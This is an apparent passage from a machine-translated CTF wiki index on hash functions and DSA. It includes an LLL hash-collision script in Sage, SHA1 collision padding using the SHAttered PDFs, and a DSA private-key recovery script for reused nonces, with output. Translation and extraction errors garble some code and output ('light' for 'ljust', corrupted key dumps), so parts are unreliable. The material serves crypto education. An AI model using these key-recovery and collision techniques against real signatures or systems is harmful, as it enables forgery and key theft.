\\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & Kg^{n-1} \\\\ 0 & 1 & 0 & \\cdots & 0 & Kg^{n-2} \\\\ 0 & 0 & 1 & \\cdots & 0 & Kg^{n-3} \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & K*mod \\\\ \\end{matrix} \\right] Then we can get two identical hashes using the LLL algorithm. from sage.all import * mod = 2 ** 256 h0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399 g = 2 ** 168 + 355 def shitty_hash ( msg ): h = h0 msg = map ( ord , msg ) for i in msg : h = ( h + i ) * g # This line is just to screw you up :)) h = h & amp ; 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff return h - 0xe6168647f636 K = 2 ** 200 N = 50 base_str = 'a' * N base = map ( word , base_str ) m = Matrix ( ZZ , N + 1 , N + 2 ) for i in xrange ( N + 1 ): ge = ZZ ( pow ( g , N - i , mod )) m [ i , i ] = 1 m [ i , N + 1 ] = ZZ ( ge * K ) m [ i , N + 1 ] = ZZ ( K * mod ) ml = m . LLL () ttt = ml . rows ()[ 0 ] print \"result:\" , ttt if ttt [ - 1 ] != 0 : print \"Zero not reached, increase K\" exit () else : msg = [] for i in xrange ( N ): msg . append ( base [ i ] + ttt [ i ]) if not ( 0 <= msg [ i ] <= 255 ): print \"Need more bytes!\" quit () print msg other = '' . join ( map ( chr , msg )) print shitty_hash ( base_str ) print shitty_hash ( other ) Note that you can't just use pow(g, N - i, mod) directly, otherwise the generated number will be in the domain corresponding to mod, which is really a big pit. as follows \u279c hashcoll sage exp.sage result: ( 15 , -14, 17 , 14 , 6 , 0 , 12 , 21 , 8 , 29 , 6 , -4, -9, 10 , -2, -12, -6, 0 , -12, 13 , -28, -28, -24, -3, 6 , -5, -16, 15 , 17 , -14, 3 , -2, -16, -25, 3 , -21, -27, -9, 16 , 5 , -1, 0 , -3, -4, -4, -19, 6 , 8 , 0 , 0 , 0 , 0 ) [ 112 , 83 , 114 , 111 , 103 , 97 , 109 , 118 , 105 , 126 , 103 , 93 , 88 , 107 , 95 , 85 , 91 , 97 , 85 , 110 , 69 , 69 , 73 , 94 , 103 , 92 , 81 , 112 , 114 , 83 , 100 , 95 , 81 , 72 , 100 , 76 , 70 , 88 , 113 , 102 , 96 , 97 , 94 , 93 , 93 , 78 , 103 , 105 , 97 , 97 ] 106025341237231370726407656306665079105509255639964756437758376184556498283725 106025341237231370726407656306665079105509255639964756437758376184556498283725 That is success.","title":"FNV"},{"location":"crypto/hash/fnv/#fowlernollvo-hash-function","text":"See https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function for details.","title":"Fowler\u2013Noll\u2013Vo hash function"},{"location":"crypto/hash/fnv/#2018-ashcoll","text":"In fact, this question was copied from NSU Crypto, https://nsucrypto.nsu.ru/archive/2017/problems_solution , the specific wp before hellman also wrote, https://gist.github.com/hellman/9bf8376cd04e7a8dd2ec7be1947261e9 . Simply look at the topic h0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399 # 2**168 + 355 g = 374144419156711147060143317175368453031918731002211 L def shitty_hash ( msg ): h = h0 msg = map ( ord , msg ) for i in msg : h = ( h + i ) * g # This line is just to screw you up :)) h = h & amp ; 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff return h - 0xe6168647f636 The topic hopes that we give two messages with the same hash value. If we expand the function, then hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256} hash(m)=h_0g^n+x_1g^n+x_2g_{n-1}+...+x_ng \\bmod 2^{256} Suppose the hash values of the two messages are the same. $ h_0g ^ n + x_1g ^ n + x_2g_ {n-1} + ... + x_ng equiv h_0g ^ n + y_1g ^ n + y_2g_ {n-1} + ... + y_ng bmod 2 ^ {256} $ and then $ (x_1-y_1) g ^ {n-1} + (x_2-y_2) g ^ {n-2} + ... + (x_n-y_n) g ^ 0 equiv 0 bmod 2 ^ {256} $ That is, we only need to find an n-dimensional vector z_i=x_i-y_i z_i=x_i-y_i , which satisfies the above equation, we can further convert it into $ z_1g ^ {n-1} + z_2g ^ {n-2} + ... + z_ng ^ 0-k * 2 ^ {256} = 0 $ That is, a set of vectors is found to satisfy the above formula. This can be thought of as a simple case of the second example in LLL Paper (see the Lattice Question section). Then we can quickly construct the matrix as follows A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & Kg^{n-1} \\\\ 0 & 1 & 0 & \\cdots & 0 & Kg^{n-2} \\\\ 0 & 0 & 1 & \\cdots & 0 & Kg^{n-3} \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & K*mod \\\\ \\end{matrix} \\right] A = \\left[ \\begin{matrix} 1 & 0 & 0 & \\cdots & 0 & Kg^{n-1} \\\\ 0 & 1 & 0 & \\cdots & 0 & Kg^{n-2} \\\\ 0 & 0 & 1 & \\cdots & 0 & Kg^{n-3} \\\\\\vdots & \\vdots & \\vdots & \\ddots & \\vdots \\\\ 0 & 0 &0 & \\cdots & 1 & K*mod \\\\ \\end{matrix} \\right] Then we can get two identical hashes using the LLL algorithm. from sage.all import * mod = 2 ** 256 h0 = 45740974929179720441799381904411404011270459520712533273451053262137196814399 g = 2 ** 168 + 355 def shitty_hash ( msg ): h = h0 msg = map ( ord , msg ) for i in msg : h = ( h + i ) * g # This line is just to screw you up :)) h = h & amp ; 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff return h - 0xe6168647f636 K = 2 ** 200 N = 50 base_str = 'a' * N base = map ( word , base_str ) m = Matrix ( ZZ , N + 1 , N + 2 ) for i in xrange ( N + 1 ): ge = ZZ ( pow ( g , N - i , mod )) m [ i , i ] = 1 m [ i , N + 1 ] = ZZ ( ge * K ) m [ i , N + 1 ] = ZZ ( K * mod ) ml = m . LLL () ttt = ml . rows ()[ 0 ] print \"result:\" , ttt if ttt [ - 1 ] != 0 : print \"Zero not reached, increase K\" exit () else : msg = [] for i in xrange ( N ): msg . append ( base [ i ] + ttt [ i ]) if not ( 0 <= msg [ i ] <= 255 ): print \"Need more bytes!\" quit () print msg other = '' . join ( map ( chr , msg )) print shitty_hash ( base_str ) print shitty_hash ( other ) Note that you can't just use pow(g, N - i, mod) directly, otherwise the generated number will be in the domain corresponding to mod, which is really a big pit. as follows \u279c hashcoll sage exp.sage result: ( 15 , -14, 17 , 14 , 6 , 0 , 12 , 21 , 8 , 29 , 6 , -4, -9, 10 , -2, -12, -6, 0 , -12, 13 , -28, -28, -24, -3, 6 , -5, -16, 15 , 17 , -14, 3 , -2, -16, -25, 3 , -21, -27, -9, 16 , 5 , -1, 0 , -3, -4, -4, -19, 6 , 8 , 0 , 0 , 0 , 0 ) [ 112 , 83 , 114 , 111 , 103 , 97 , 109 , 118 , 105 , 126 , 103 , 93 , 88 , 107 , 95 , 85 , 91 , 97 , 85 , 110 , 69 , 69 , 73 , 94 , 103 , 92 , 81 , 112 , 114 , 83 , 100 , 95 , 81 , 72 , 100 , 76 , 70 , 88 , 113 , 102 , 96 , 97 , 94 , 93 , 93 , 78 , 103 , 105 , 97 , 97 ] 106025341237231370726407656306665079105509255639964756437758376184556498283725 106025341237231370726407656306665079105509255639964756437758376184556498283725 That is success.","title":"2018 \u7f51\u9f0e\u676fashcoll"},{"location":"crypto/hash/introduction/","text":"hash function \u00b6 A hash function compresses a message or data into a digest, making the amount of data smaller. Its general model is as follows Obviously for any hash value, there are theoretically several messages corresponding to it, namely collisions. The basic requirements of the hash function are as follows Requirements Description | Input length variable | hash function can be applied to data of any length | | Output length fixed | The output length of the hash function is fixed | | Efficiency | For any message x x , calculating H(x) H(x) is easy | | Unidirectional | For any hash value h, it is computationally infeasible to find x that satisfies H(x)=h H(x)=h . | | Weak Collision Resistance | For any message x, finding another message y that satisfies H(x)=H(y) H(x)=H(y) is not computationally feasible. | | Strong Collision Resistance | Finding any pair of messages x and y that satisfy H(x)=H(y) H(x)=H(y) is not computationally feasible. | | Pseudo-randomness | The output of the hash function satisfies the pseudo-randomness test criteria. | The purpose of the hash value is as follows Ensuring the integrity of the message, ie ensuring that the data received is exactly the same as it was sent (ie no modification, insertion, deletion or replay) to prevent tampering by the intermediary. Redundancy check One-way password file, such as the password of the Linux system Signature detection in intrusion detection and virus detection The current Hash functions mainly include MD5, SHA1, SHA256, and SHA512. Most of the current hash functions are iterative, that is, using the same hash function and performing multiple iterations with different parameters. Algorithm Type Output Hash Value Length | MD5 | 128 bit / 256 bit | | SHA1 | 160 bit | | SHA256 | 256 bit | | SHA512 | 512 bit |","title":"Introduction to the Hash Function"},{"location":"crypto/hash/introduction/#hash-function","text":"A hash function compresses a message or data into a digest, making the amount of data smaller. Its general model is as follows Obviously for any hash value, there are theoretically several messages corresponding to it, namely collisions. The basic requirements of the hash function are as follows Requirements Description | Input length variable | hash function can be applied to data of any length | | Output length fixed | The output length of the hash function is fixed | | Efficiency | For any message x x , calculating H(x) H(x) is easy | | Unidirectional | For any hash value h, it is computationally infeasible to find x that satisfies H(x)=h H(x)=h . | | Weak Collision Resistance | For any message x, finding another message y that satisfies H(x)=H(y) H(x)=H(y) is not computationally feasible. | | Strong Collision Resistance | Finding any pair of messages x and y that satisfy H(x)=H(y) H(x)=H(y) is not computationally feasible. | | Pseudo-randomness | The output of the hash function satisfies the pseudo-randomness test criteria. | The purpose of the hash value is as follows Ensuring the integrity of the message, ie ensuring that the data received is exactly the same as it was sent (ie no modification, insertion, deletion or replay) to prevent tampering by the intermediary. Redundancy check One-way password file, such as the password of the Linux system Signature detection in intrusion detection and virus detection The current Hash functions mainly include MD5, SHA1, SHA256, and SHA512. Most of the current hash functions are iterative, that is, using the same hash function and performing multiple iterations with different parameters. Algorithm Type Output Hash Value Length | MD5 | 128 bit / 256 bit | | SHA1 | 160 bit | | SHA256 | 256 bit | | SHA512 | 512 bit |","title":"hash function"},{"location":"crypto/hash/md5/","text":"MD5 \u00b6 Basic description \u00b6 The input and output of MD5 are as follows Input: Any long message, 512-bit long packet. Output: 128-bit message digest. For a detailed introduction, please search for yourself. In addition, sometimes the md5 we get is 16-bit. In fact, the 16-bit is the length of the 32-bit md5, which is derived from the 32-bit md5 value. It is to remove the first eight bits of 32-bit md5 and get the last eight bits. In general, we can determine whether it is an MD5 function by initializing the function. In general, if a function has the following four initialized variables, you can guess that the function is an MD5 function, because this is the initialization IV of the MD5 function. 0x67452301\uff0c0xEFCDAB89\uff0c0x98BADCFE\uff0c0x10325476 Crack \u00b6 At present, it can be said that md5 has been basically broken. The general MD5 collision can be obtained on the following online. http://www.cmd5.com/ http://www.ttmd5.com/ http://pmd5.com/ https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip (generate md5 collision with the specified prefix) topic \u00b6 CFF 2016 a lot of salt JarvisOJ a lot of salt","title":"MD5"},{"location":"crypto/hash/md5/#md5","text":"","title":"MD5"},{"location":"crypto/hash/md5/#basic-description","text":"The input and output of MD5 are as follows Input: Any long message, 512-bit long packet. Output: 128-bit message digest. For a detailed introduction, please search for yourself. In addition, sometimes the md5 we get is 16-bit. In fact, the 16-bit is the length of the 32-bit md5, which is derived from the 32-bit md5 value. It is to remove the first eight bits of 32-bit md5 and get the last eight bits. In general, we can determine whether it is an MD5 function by initializing the function. In general, if a function has the following four initialized variables, you can guess that the function is an MD5 function, because this is the initialization IV of the MD5 function. 0x67452301\uff0c0xEFCDAB89\uff0c0x98BADCFE\uff0c0x10325476","title":"Basic description"},{"location":"crypto/hash/md5/#crack","text":"At present, it can be said that md5 has been basically broken. The general MD5 collision can be obtained on the following online. http://www.cmd5.com/ http://www.ttmd5.com/ http://pmd5.com/ https://www.win.tue.nl/hashclash/fastcoll_v1.0.0.5.exe.zip (generate md5 collision with the specified prefix)","title":"Crack"},{"location":"crypto/hash/md5/#topic","text":"CFF 2016 a lot of salt JarvisOJ a lot of salt","title":"topic"},{"location":"crypto/hash/sha1/","text":"SHA1 \u00b6 Basic description \u00b6 The input and output of SHA1 are as follows Input: Any long message divided into 512 bits long packets. First, bit 1 is added to the right side of the message, and then a number of bits 0 are added until the bit length of the message satisfies the modulo remainder of 512, which is 448, which is congruent with 448 modulo 512. Output: 160-bit message digest. For a detailed introduction, please search for yourself. In general, we can determine whether the SHA1 function is through the initialization of the function. In general, if a function has the following five initialized variables, you can guess that the function is a SHA1 function, because this is the initialization IV of the SHA1 function. 0x67452301 0xEFCDAB89 0x98BADCFE 0x10325476 0xC3D2E1F0 The first four are similar to the MD5, and the latter are new. Crack \u00b6 For now, SHA1 is no longer safe, because Google has previously published two pdfs with the same sha1 value, please refer to [shattered] ( https://shattered.io/ ). There is also a more interesting website here: https://alf.nu/SHA1 . 2017 SECCON SHA1 is dead \u00b6 The title is described below file1 != file2 SHA1(file1) == SHA1(file2) SHA256(file1) <> SHA256(file2) 2017KiB < sizeof(file1) < 2018KiB 2017KiB < sizeof(file2) < 2018KiB 1KiB = 1024 bytes That is, we need to find two files that satisfy the above constraints. Here is the idea of Google's previously published documents, and, very importantly, as long as the given first 320 bytes, the hash added after adding the same byte is still the same, here we test the following \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-1.pdf | sha1sum Recorded the reading of 320 +0 Recorded the write of 320 +0 320 bytes copied, 0 .00796817 s, 40 .2 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-2.pdf | sha1sum Recorded the reading of 320 +0 Recorded the write of 320 +0 320 bytes copied, 0 .00397215 s, 80 .6 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - Then we can write the program directly, as follows from hashlib import sha1 from hashlib import sha256 pdf1 = open ( './shattered-1.pdf' ) . read ( 320 ) pdf2 = open ( './shattered-2.pdf' ) . read ( 320 ) pdf1 = pdf1 . ljust ( 2017 * 1024 + 1 - 320 , & quot ; 00 & quot ;) #padding pdf to 2017Kib + 1 pdf2 = pdf2 . light ( 2017 * 1024 + 1 - 320 , & quot ; 00 & quot ;) open ( \"upload1\" , \"w\" ) . write ( pdf1 ) open ( \"upload2\" , \"w\" ) . write ( pdf2 ) print sha1 ( pdf1 ) . hexdigest () print sha1 ( pdf2 ) . hexdigest () print sha256 ( pdf1 ) . hexdigest () print sha256 ( pdf2 ) . hexdigest () references \u00b6 https://www.slideshare.net/herumi/googlesha1","title":"SHA1"},{"location":"crypto/hash/sha1/#sha1","text":"","title":"SHA1"},{"location":"crypto/hash/sha1/#basic-description","text":"The input and output of SHA1 are as follows Input: Any long message divided into 512 bits long packets. First, bit 1 is added to the right side of the message, and then a number of bits 0 are added until the bit length of the message satisfies the modulo remainder of 512, which is 448, which is congruent with 448 modulo 512. Output: 160-bit message digest. For a detailed introduction, please search for yourself. In general, we can determine whether the SHA1 function is through the initialization of the function. In general, if a function has the following five initialized variables, you can guess that the function is a SHA1 function, because this is the initialization IV of the SHA1 function. 0x67452301 0xEFCDAB89 0x98BADCFE 0x10325476 0xC3D2E1F0 The first four are similar to the MD5, and the latter are new.","title":"Basic description"},{"location":"crypto/hash/sha1/#crack","text":"For now, SHA1 is no longer safe, because Google has previously published two pdfs with the same sha1 value, please refer to [shattered] ( https://shattered.io/ ). There is also a more interesting website here: https://alf.nu/SHA1 .","title":"Crack"},{"location":"crypto/hash/sha1/#2017-seccon-sha1-is-dead","text":"The title is described below file1 != file2 SHA1(file1) == SHA1(file2) SHA256(file1) <> SHA256(file2) 2017KiB < sizeof(file1) < 2018KiB 2017KiB < sizeof(file2) < 2018KiB 1KiB = 1024 bytes That is, we need to find two files that satisfy the above constraints. Here is the idea of Google's previously published documents, and, very importantly, as long as the given first 320 bytes, the hash added after adding the same byte is still the same, here we test the following \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-1.pdf | sha1sum Recorded the reading of 320 +0 Recorded the write of 320 +0 320 bytes copied, 0 .00796817 s, 40 .2 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - \u279c 2017_seccon_sha1_is_dead git: ( master ) dd bs = 1 count = 320 <shattered-2.pdf | sha1sum Recorded the reading of 320 +0 Recorded the write of 320 +0 320 bytes copied, 0 .00397215 s, 80 .6 kB/s f92d74e3874587aaf443d1db961d4e26dde13e9c - Then we can write the program directly, as follows from hashlib import sha1 from hashlib import sha256 pdf1 = open ( './shattered-1.pdf' ) . read ( 320 ) pdf2 = open ( './shattered-2.pdf' ) . read ( 320 ) pdf1 = pdf1 . ljust ( 2017 * 1024 + 1 - 320 , & quot ; 00 & quot ;) #padding pdf to 2017Kib + 1 pdf2 = pdf2 . light ( 2017 * 1024 + 1 - 320 , & quot ; 00 & quot ;) open ( \"upload1\" , \"w\" ) . write ( pdf1 ) open ( \"upload2\" , \"w\" ) . write ( pdf2 ) print sha1 ( pdf1 ) . hexdigest () print sha1 ( pdf2 ) . hexdigest () print sha256 ( pdf1 ) . hexdigest () print sha256 ( pdf2 ) . hexdigest ()","title":"2017 SECCON SHA1 is dead"},{"location":"crypto/hash/sha1/#references","text":"https://www.slideshare.net/herumi/googlesha1","title":"references"},{"location":"crypto/signature/dsa/","text":"DSA \u00b6 The ElGamal signature algorithm described above is not commonly used in practice, and its variant DSA is more commonly used. Fundamental \u00b6 Key Generation \u00b6 Select a suitable hash function. Currently, SHA1 is generally selected. Currently, a stronger hash function H can be selected. Select the length L and N of the key, which determine the security of the signature. In the original DSS ( Digital Signature Standard ) it was suggested that L must be a multiple of 64, and 512 \\leq L \\leq 1024 512 \\leq L \\leq 1024 , of course, can be larger. The N must be no larger than the length of the hash function H output. FIPS 186-3 gives some suggested examples of L and N values: (1024, 160), (2048, 224), (2048, 256), and (3, 072, 256). Select the prime number q of N bits. Select the prime number p of L bits such that p-1 is a multiple of q. Select the g that satisfies the minimum positive integer k of g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p as q, ie g in the background of modulo p, ord(g)=q. That is, in the sense of modulo p, its exponential power can generate subgroups with q elements. Here, we can get g by calculating g=h^{\\frac{p-1}{q}} \\bmod p g=h^{\\frac{p-1}{q}} \\bmod p , where 1< h < p-1 1&lt; h &lt; p-1 . Select private key x, 0 <x<q 0 <x<q \uff0c\u8ba1\u7b97 y \\equiv g^x \\bmod p y \\equiv g^x \\bmod p \u3002 The public key is (p, q, g, y) and the private key is (x). Signature \u00b6 The signature steps are as follows Select the random integer number k as the temporary key, 0 <k<q 0 <k<q \u3002 Calculate r\\equiv (g^k \\bmod p) \\bmod q r\\equiv (g^k \\bmod p) \\bmod q Calculate s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q The result of the signature is (r, s). It should be noted that the important difference here with Elgamal is that the hash function is used to hash the message. Verification \u00b6 The verification process is as follows Calculate the auxiliary value, w=s^{-1} \\bmod q w=s^{-1} \\bmod q Calculate the auxiliary value, u_1=H(m)w \\bmod q u_1=H(m)w \\bmod q Calculate the auxiliary value, u_2=rw \\bmod q u_2=rw \\bmod q \u8ba1\u7b97 $ v = (g ^ y ^ {} {u_1 u_2} way p) $ q way If v is equal to r, the verification is successful. Correctness derivation \u00b6 First, g satisfies the minimum positive integer k of g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p as q. So g^q \\equiv 1 \\bmod p g^q \\equiv 1 \\bmod p . So g^x \\equiv g^{x \\bmod q} \\bmod p g^x \\equiv g^{x \\bmod q} \\bmod p . and then v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} v=(g^{u_1}y^{u_2} \\bmod p) \\bmod q=g^{u_1}g^{xu_2} \\equiv g^{H(m)w}g^{xrw} \\equiv g^{H(m)w+xrw} Also s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q and w=s^{-1} \\bmod q w=s^{-1} \\bmod q k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q k \\equiv s^{-1}(H(m)+xr) \\equiv H(m)w+xrw \\bmod q So v \\equiv g^k v \\equiv g^k . Correctness is proven. safety \u00b6 Known k \u00b6 Principle \u00b6 If we know the random key k, then we can calculate the private key d based on s\\equiv (H(m)+xr)k^{-1} \\bmod q s\\equiv (H(m)+xr)k^{-1} \\bmod q , which almost breaks the DSA. In general, the hash value of the message will be given. x \\equiv r^{-1}(ks-H(m)) \\bmod q x \\equiv r^{-1}(ks-H(m)) \\bmod q k\u5206\u4eab \u00b6 Principle \u00b6 If k is shared during the two signatures, we can attack. Suppose the signed message is m1, m2, obviously, the values of r are the same, in addition s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_1\\equiv (H(m_1)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q s_2\\equiv (H(m_2)+xr)k^{-1} \\bmod q Here we don't know the rest except x and k, then s_1k \\equiv H(m_1)+xr s_1k \\equiv H(m_1)+xr s_2k \\equiv H(m_2)+xr s_2k \\equiv H(m_2)+xr Two-type subtraction k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q k(s_1-s_2) \\equiv H(m_1)-H(m_2) \\bmod q At this point, we can solve for k, and further we can solve x. Example \u00b6 Here we take the DSA of the Huxiang Cup as an example, but we can't do it directly, because we found that the signature did not pass when verifying message4. I have no source questions. , here I take the modified topic DSA in Jarvis OJ as an example. \u279c 2016 Hunan Cup DSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet1/sign1.bin packet1/message1 Verified OK \u279c 2016 Hunan Cup DSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message1 packet2/message1: No such file or directory \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet2/sign2.bin packet2/message2 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet3/sign3.bin packet3/message3 Verified OK \u279c 2016\u6e56\u6e58\u676fDSA git: ( master ) \u2717 openssl sha1 -verify dsa_public.pem -signature packet4/sign4.bin packet4/message4 Verified OK It can be seen that all four messages are verified. The reason why I think of sharing k here is because the title of the PS3 has been used to crack this method, from the online search can know the attack. Below, let's take a look at the signed value, the command used here is as follows \u279c 2016 Huxiang Cup DSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet4/sign4.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 : d = 1 hl = 2 = 20 prime: INTEGER: 5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 :d = 1 hl = 2 l = 20 prim: INTEGER :5E10DED084203CCBCEC3356A2CA02FF318FD4123 \u279c 2016 Huxiang Cup DSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet3/sign3.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 : d = 1 hl = 2 = 20 prime: INTEGER: 5090DA81FEDE048D706D80E0AC47701E5A9EF1CC 24 : d = 1 hl = 2 l = 20 prim: INTEGER: 30EB88E6A4BFB1B16728A974210AE4E41B42677D \u279c 2016 Hunan Cup DSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet2/sign2.bin 0 :d = 0 hl = 2 l = 44 cons: SEQUENCE 2 : d = 1 hl = 2 l = 20 prim: INTEGER: 60B9F2A5BA689B802942D667ED5D1EED066C5A7F 24 : d = 1 hl = 2 l = 20 prim: INTEGER: 3DC8921BA26B514F4D991A85482750E0225A15B5 \u279c 2016 Hunan Cup DSA git: ( master ) \u2717 openssl asn1parse -inform der -in packet1/sign1.bin 0 :d = 0 hl = 2 l = 45 cons: SEQUENCE 2 : d = 1 hl = 2 l = 21 prim: INTEGER: 8158B477C5AA033D650596E93653C730D26BA409 25 : d = 1 hl = 2 l = 20 prim: INTEGER: 165B9DD1C93230C31111E5A4E6EB5181F990F702 Among them, the first value obtained is r, and the second value is s. You can see that the 4 th packet and the 3 rd packet share k because their r is the same. Here we can use openssl to see the public key \u279c 2016 Hunan Cup DSA git: ( master ) \u2717 openssl dsa -in dsa_public.pem -text -noout -pubin read DSA key pub: 45 : bb: 18 : f6: 0e: b0: 51 : f9: d4: 8c: d9: 56 : 33 :0a:4f:f3:0a:f5:34:4f:6c:95:40:06:1d:53:83: 29 : 2d: 95 : c4: df: c8: ac: 26 : c: 45 : 2e: 17 : e: 5c: c6: 15 : 9e: 03 : 7b: cc: f5: 64 : ef: 36 : 1c: 18 : c9: : 9 : 8 : 1 : 2 : 1 : 2 : 1 : 6 : 1 : 1 : 6 : 1 : 1 : 60 : bb: 73 : 0d: 60 : bb: 73 : 0 : 60 : 1 : 2 11 :f1:cf:08:cf:bc:34:cc:aa:79:ef:1d:ad:8a:7a: 6f: ac: it: 86 : 65 : 90 : 06 : d4: fa: f0: 57 : 71 : 68 : 57 : ec: 7c: a6: 04 : ad: e2: c3: d7: 31 : d6: d0: 2f: 93 : 31 : 98 : d3: 90 : c3: ef: c3: f3: ff: 04 : 6f P: 00 :c0:59:6c:3b:5e:93:3d:33:78:be:36:26:be:31: 5e: e7: 0c: a6: b5: b1: 1a: 51 : 9b: 55 : 23 : d4: 45 : 66 : e2: 2c: c8: 8b: f: c5: 6a: ad: 66 : ad:28:13:88:f0:bb:c6:b8:02:6b:7c:80:26:e9:11: 84 :be:e0:c8:ad:10:cc:f2:96:be:cf:e5:05:05:38: 3c: b4: a9: 54 : b3: 7c: b5: 88 : 67 : 2f: 7c: f2: fa: 05 : 38 : fd: ad: 83 : 93 : 4a: 45 : e4: f9: 9d: 38 : from: 57 :c0:8a:24:d0:0d:1c:c5:d5:fb:db:73:29:1c:d1: 0c: e7: 57 : 68 : 90 : b6: ba: 08 : 9b Q: 00 : 86 : 8f: 78 : b8: c8: 50 : 0b: eb: f6: 7a: 58 : e3: 53 : 9d: 35 : 70 : d1: bd G: 4c: d5: e6: b6: 6a: 6e: b7: e9: 27 : 94 : cb: 11 : af: 5a: 08 : d9: d4: f8: a3: f2: 50 : 03 : 72 : 91 : ba: 5f: ff: 3c: 29 : a8: c3: 7b: c4: ee: 5f: 98 : ec: 17 : f4: 18 : bc: 71 : 61 : 01 : 6c: 94 : c8: 49 : 02 : e4: 00 : d8:cf:6a:61:c1:3a:fd:56:73:ca:a5:fb:41:15:08: cd:b3:50:1b:df:f7:3e:74:79:25:f7:65:86:f4:07: 9f: it: 12 : 09 : 8b: 34 : 50 : 84 : 4 : 2 : 9e: 5d: 0A: 99 : bd: 86 : 5 : 05 : 70 : d5: 19 : 7d: f4: a1: c9: b8: 01 : 8f: b9: 9c: dc: e9: 15 : 7b: 98 : 50 : 01 : 79 Below, we can directly use the above principle to write a program, the program is as follows #coding=utf8 from Crypto.PublicKey import DSA from hashlib import sha1 import gmpy2 with open ( './dsa_public.pem' ) as f : key = DSA . importKey ( f ) y = key . y g = key . g p = key . p q = key . q f3 = open ( r \"packet3/message3\" , 'r' ) f4 = open ( r \"packet4/message4\" , 'r' ) data3 = f3 . read () data4 = f4 . read () Sha = sha1 () sha . update ( data3 ) m3 = int ( sha . hexdigest (), 16 ) Sha = sha1 () sha . update ( data4 ) m4 = int ( sha . hexdigest (), 16 ) print m3 , m4 s3 = 0x30EB88E6A4BFB1B16728A974210AE4E41B42677D s4 = 0x5E10DED084203CCBCEC3356A2CA02FF318FD4123 r = 0x5090DA81FEDE048D706D80E0AC47701E5A9EF1CC ds = s4 - s3 dm = m4 - m3 k = gmpy2 . mul ( dm , gmpy2 . invert ( ds , q )) k = gmpy2 . f_mod ( k , q ) tmp = gmpy2 . mul ( k , s3 ) - m3 x = tmp * gmpy2 . invert ( r , q ) x = gmpy2 . f_mod ( x , q ) print int ( x ) I found that pycrypto installed by pip does not have the importKey function of DSA. . . I had to download and install pycrypto from github. . . Results are as follows \u279c 2016 Huxiang Cup DSA git: ( master ) \u2717 python exp.py 1104884177962524221174509726811256177146235961550 943735132044536149000710760545778628181961840230 520793588153805320783422521615148687785086070744","title":"DSA Digital Signature"},{"location":"crypto/signature/dsa/#dsa","text":"The ElGamal signature algorithm described above is not commonly used in practice, and its variant DSA is more commonly used.","title":"DSA"},{"location":"crypto/signature/dsa/#fundamental","text":"","title":"Fundamental"},{"location":"crypto/signature/dsa/#key-generation","text":"Select a suitable hash function. Currently, SHA1 is generally selected. Currently, a stronger hash function H can be selected. Select the length L and N of the key, which determine the security of the signature. In the original DSS ( Digital Signature Standard ) it was suggested that L must be a multiple of 64, and 512 \\leq L \\leq 1024 512 \\leq L \\leq 1024 , of course, can be larger. The N must be no larger than the length of the hash function H output. FIPS 186-3 gives some suggested examples of L and N values: (1024, 160), (2048, 224), (2048, 256), and (3, 072, 256). Select the prime number q of N bits. Select the prime number p of L bits such that p-1 is a multiple of q. Select the g that satisfies the minimum positive integer k of g^k \\equiv 1 \\bmod p g^k \\equiv 1 \\bmod p as q, ie g in the background of modulo p, ord(g)=q. That is, in the sense of modulo p, its exponential power can generate subgroups with q elements. Here, we can get g by calculating g=h^{\\frac{p-1}{q}} \\bmod p g=h^{\\frac{p-1}{q}} \\bmod p , where 1< h < p-1 1&lt; h &lt; p-1 . Select private key x, 0 <x<q 0 <x<q \uff0c\u8ba1\u7b97 y \\equiv g^x \\bmod p y \\equiv g^x \\bmod p \u3002 The public key is (p, q, g, y) and the private key is (x).","title":"Key Generation"},{"location":"crypto/signature/dsa/#signature","text":"The signature steps are as follows Select the random integer number k as the temporary key, 0 <k<q 0 <k<q \u3002 Calculate r\\equiv (g^k \\bmod p) \\bmod 